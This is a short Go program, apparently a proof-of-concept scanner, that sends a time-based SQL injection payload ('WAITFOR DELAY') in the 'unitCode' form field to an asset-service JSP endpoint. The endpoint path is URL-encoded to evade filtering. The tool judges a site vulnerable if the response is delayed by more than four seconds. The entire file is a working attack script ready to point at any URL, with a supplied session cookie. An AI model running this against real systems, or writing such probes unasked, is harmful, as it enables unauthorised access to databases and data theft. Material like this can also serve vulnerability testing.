package main

import (
	"flag"
	"fmt"
	"log"
	"time"

	"github.com/go-resty/resty/v2"
)

func main() {
	var url = flag.String("url", "", "输入url")
	var cookie = flag.String("c", "", "cookie")
	flag.Parse()
	payload := map[string]string{
		"unitCode": "1';WAITFOR DELAY '0:0:5'--",
	}
	seturl := *url + "/assetsGroupReport/assetsService.j%73p"
	fmt.Println(seturl)
	client := resty.New()
	resp, err := client.R().SetHeader("cookie", *cookie).
		SetFormData(payload).
		Post(seturl)

	if err != nil {
		log.Fatal(err)
	}
	if resp.StatusCode() == 200 && resp.Time() > 4*time.Second {
		fmt.Printf("[+]该网站疑似有漏洞, 状态码: %d, 响应时间: %v ", resp.StatusCode(), resp.Time())

	} else {
		fmt.Printf("该网站没有此页面或者被waf拦截, 状态码: %d", resp.StatusCode())
	}
}
